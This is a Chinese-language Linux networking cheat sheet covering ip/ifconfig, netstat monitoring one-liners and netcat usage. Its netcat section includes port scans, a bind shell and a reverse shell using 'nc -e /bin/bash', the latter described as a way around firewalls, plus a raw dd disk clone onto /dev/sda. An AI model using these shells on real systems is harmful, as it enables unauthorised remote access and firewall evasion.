Linux 网络连接
===

这个快速参考备忘单提供了使用 Linux 网络连接 常用命令的使用清单

常用操作
-----

### 网络 01

参数 | action
:--- | :---
**`ifconfig`** | 显示所有网络接口的IP地址
`netstat -pnltu` | 显示所有活动监听端口
`netstat -anp` | 查找不常用的监听端口
`ip link \| grep PROMISC` | 查找监听模式的网卡
`lsof -i` | 运行的进程监听了端口
`arp -a` | ARP表
`route -n` | 路由表

### 网络 02
<!--rehype:wrap-class=row-span-1-->

:--- | :---
:--- | :---
**`ip addr show`** | 显示IP地址和所有网络接口
**`ip address add 192.168.0.1/24 dev eth0`** | 将IP地址192.168.0.1分配给接口eth0
**`ping host`** | ping命令发送ICMP回送请求以建立到服务器/PC的连接
**`hostname -i`** | 显示本地IP地址

<!--rehype:className=style-list-->

### 网络 03
<!--rehype:wrap-class=row-span-1-->

:--- | :---
:--- | :---
**`whois domain`** | 检索有关域名的更多信息
**`dig domain`** | 检索关于域的DNS信息
**`dig -x host`** | 对域执行反向查找
**`host google.com`** | 执行域名的IP查找
**`wget file_name`** | 从在线资源下载文件
**`traceroute -n ip`** | 追踪网络路由途径




Netstat 备忘清单
-----

### 入门实例

端口 80 上的所有连接

```shell
$ netstat -anp | grep :80
```

网络统计帮助

```shell
$ netstat -h
```

### 监听

选项 | 说明
:- | :-
`netstat -ltunp` | 所有监听端口
`netstat -ltn`   | 监听 TCP 端口
`netstat -lun`   | 监听 UDP 端口
`netstat -lx`    | 监听 Unix 端口
`netstat -lt` | 仅列出侦听 TCP 端口
`netstat -lu` | 仅列出侦听 UDP 端口
`netstat -l` | 列出所有监听条件

### 连接
<!--rehype:wrap-class=row-span-2-->

选项 | 说明
:- | :-
`netstat -a`  | 所有连接
`netstat -at` | 所有 TCP 连接
`netstat -au` | 所有 UDP 连接
`netstat -ant` | 显示没有反向 DNS 查找的 IP 地址

选项 | 说明
:- | :-
`netstat` | 活动连接
`netstat -a` | 所有连接
`netstat -at` | 所有 TCP 连接
`netstat -au` | 所有 UDP 连接
`netstat -ant` | 显示没有反向 DNS 查找的 IP 地址
`netstat -tnl` | 监听 TCP 端口
`netstat -unl` | 监听 UDP 端口

### 网络

选项 | 说明
:- | :-
`netstat -i`  | 显示网络接口
`netstat -ie` | 显示网络接口扩展信息
`netstat -n` | 仅显示 IP 地址
`netstat -F` | 尽可能显示 IP 地址的域名

### 路由

选项 | 说明
:- | :-
`netstat -r`  | 显示路由表
`netstat -rn` | 显示路由表，不解析主机

### 统计数据
<!--rehype:wrap-class=row-span-3-->

选项 | 说明
:- | :-
`netstat -s`  | 显示统计信息
`netstat -st` | 显示 TCP 统计信息
`netstat -su` | 显示 UDP 统计信息
`netstat -ltpe` | 使用进程信息和扩展信息显示 TCP 的侦听连接
`netstat -tp` | 显示带有 PID 编号的服务名称
`sudo netstat -nlpt` | 列出进程名称/PID 和用户 ID
`netstat -nlptue` | 所有带有 PID 和扩展信息的侦听端口
`netstat -M` | 显示伪装的连接

### 显示没有域名的 TCP 连接

```bash
$ netstat --tcp --numeric
```

### 显示活动/已建立的连接

```bash
$ netstat -atnp | grep ESTA
```

### 获取活动连接的连续列表

```bash
$ watch -d -n0 "netstat -atnp | grep ESTA"
```

### 显示到特定端口的所有打开连接

```bash
$ netstat -anp | grep":"
```

插入`端口`号（上图）代替冒号 `:`

### 检查服务是否正在运行

```bash
$ sudo netstat -aple | grep ntp
```

你可以用`http`、`smtp`代替`ntp`

Netstat – 安全命令
---

### 显示具有大量连接的 IP
<!--rehype:wrap-class=col-span-3-->

```bash
$ netstat -tn 2>/dev/null | grep :80 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head
```
<!--rehype:className=wrap-text -->

### 连接到端口 80 的 IP 地址
<!--rehype:wrap-class=col-span-3-->

```bash
$ netstat -tn 2>/dev/null | grep ':80 ' | awk '{print $5}' |sed -e 's/::ffff://' | cut -f1 -d: | sort | uniq -c | sort -rn | head
```
<!--rehype:className=wrap-text -->

### 显示端口 80 上的活动连接数

```bash
$ netstat -an |grep :80 |wc -l
```

### 仅显示外部 IP 地址
<!--rehype:wrap-class=col-span-2-->

```bash
$ netstat -antu | grep :80 | grep -v LISTEN | awk '{print $5}'
```

### 显示活动 SYNC_REC
<!--rehype:wrap-class=row-span-2-->

以下命令将输出服务器上正在发生和正在发生的活动 `SYNC_REC` 数量。数量应该很低(小于 `5`)。如果该数字为两位数，则您可能正在遭受 `DoS` 攻击或被邮件轰炸。

```bash
$ netstat -n -p|grep SYN_REC | wc -l
```

#### 列出发送 SYN_REC 连接的唯一 IP 地址

```bash
$ netstat -n -p | grep SYN_REC | awk '{print $5}' | awk -F: '{print $1}'
```
<!--rehype:className=wrap-text -->

与上面的命令一样，该命令也列出了发送 `SYN_REC` 连接状态的节点的所有唯一 `IP` 地址

### 每个远程 IP 的连接数
<!--rehype:wrap-class=col-span-2-->

```bash
$ netstat -antu | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | sort -n
```
<!--rehype:className=wrap-text -->

或者

```bash
$ netstat -antu | awk '$5 ~ /[0-9]:/{split($5, a, ":"); ips[a[1]]++} END {for (ip in ips) print ips[ip], ip | "sort -k1 -nr"}'
```
<!--rehype:className=wrap-text -->

### 检查开放端口（ipv4 和 ipv6）

```bash
$ netstat -plntu
```

### 检查开放端口（ipv4 和 ipv6）

```bash
$ netstat -plnt
```

### 每个 IP 的打开连接数

```bash
$ netstat -an | grep 80 | wc -l
```

### 活跃的互联网连接

```bash
$ netstat -pnut -w | column -t -s $'\t'
```


Netcat 备忘清单
------
<!--rehype:body-class=cols-5-->

### 用法
<!--rehype:wrap-class=col-span-2-->

连接到位于任何地方的主机

```shell
$ nc [options] [host] [port]
```

监听传入连接

```shell
$ nc -lp port [host] [port]
```

### 选项示例
<!--rehype:wrap-class=col-span-3 row-span-2-->

选项 | 示例 | 说明
:- | :- | :-
`-h`   | nc -h                      | 帮助
`-z`   | nc -z 192.168.1.9 1-100    | 端口扫描主机或 `IP` 地址
`-v`   | nc -zv 192.168.1.9 1-100   | 提供详细输出
`-n`   | nc -zn 192.168.1.9 1-100   | 通过禁用 `DNS` 解析进行快速扫描
`-l`   | nc -lp 8000                | `TCP` 侦听模式 _(用于入站连接)_
`-w`   | nc -w 180 192.168.1.9 8000 | 定义超时值
`-k`   | nc -kl 8000                | 断线后继续收听
`-u`   | nc -u 192.168.1.9 8000     | 使用 `UDP` 而不是 `TCP`
`-q`   | nc -q 1 192.168.1.9 8000   | 客户在 `EOF` 后熬夜
`-4`   | nc -4 -l 8000              | 仅限 `IPv4`
`-6`   | nc -6 -l 8000              | 仅限 `IPv6`

### 聊天客户端-服务器
<!--rehype:wrap-class=col-span-2-->

服务器 Server (192.168.1.9)

```shell
$ nc -lv 8000
```

客户端 Client

```shell
$ nc 192.168.1.9 8000
```

Netcat 示例
--------

### Banner 抓取

```shell
$ nc website.com 80
GET index.html HTTP/1.1
HEAD / HTTP/1.1
```

或者

```shell
echo "" | nc -zv -wl 192.168.1.1 801-805
```

### 端口扫描

扫描 `21` 到 `25` 之间的端口

```shell
$ nc -zvn 192.168.1.1 21-25
```

扫描端口 `22`、`3306` 和 `8080`

```shell
$ nc -zvn 192.168.1.1 22 3306 8080
```

### 代理和端口转发

```shell
$ nc -lp 8001 -c "nc 127.0.0.1 8000"
```

或者

```shell
$ nc -l 8001 | nc 127.0.0.1 8000
```

创建从一个本地端口到另一个本地端口的隧道

### 下载文件

服务器 Server (192.168.1.9)

```shell
$ nc -lv 8000 < file.txt
```

客户端 Client

```shell
$ nc -nv 192.168.1.9 8000 > file.txt
```

假设您想将文件 `file.txt` 从服务器 A 传输到客户端 B。

### 上传文件

服务器 Server (192.168.1.9)

```shell
$ nc -lv 8000 > file.txt
```

客户端 Client

```shell
$ nc 192.168.1.9 8000 < file.txt
```

假设您想将文件 `file.txt` 从客户端 `B` 传输到服务器 `A`

### 目录传输

服务器 Server (192.168.1.9)

```shell
$ tar -cvf – dir_name | nc -l 8000
```

客户端 Client

```shell
$ nc -n 192.168.1.9 8000 | tar -xvf -
```

假设您想通过网络将目录从 `A` 传输到 `B`

### 加密传输
<!--rehype:wrap-class=col-span-2-->

服务器 Server (192.168.1.9)

```shell
$ nc -l 8000 | openssl enc -d -des3 -pass pass:password > file.txt
```

客户端 Client

```shell
$ openssl enc -des3 -pass pass:password | nc 192.168.1.9 8000
```

在通过网络传输之前加密数据

### 克隆

服务器 Server (192.168.1.9)

```shell
$ dd if=/dev/sda | nc -l 8000
```

客户端 Client

```shell
$ nc -n 192.168.1.9 8000 | dd of=/dev/sda
```

克隆 linux PC 非常简单。假设你的系统盘是 /dev/sda

### 视频流

服务器 Server (192.168.1.9)

```shell
$ cat video.avi | nc -l 8000
```

客户端 Client

```shell
$ nc 192.168.1.9 8000 | mplayer -vo x11 -cache 3000 -
```

使用 netcat 流式传输视频

### 远程 shell

服务器 Server (192.168.1.9)

```shell
$ nc -lv 8000 -e /bin/bash
```

客户端 Client

```shell
$ nc 192.168.1.9 8000
```

我们已经使用 `telnet` 和 `ssh` 使用远程 `Shell`，但是如果它们没有安装并且我们没有安装它们的权限，那么我们也可以使用 `netcat` 创建远程 `shell`

### 逆转 shell

服务器 Server (192.168.1.9)

```shell
$ nc -lv 8000
```

客户端 Client

```shell
$ nc 192.168.1.9 8000 -v -e /bin/bash
```

反向 `shell` 通常用于绕过防火墙限制，例如阻止入站连接



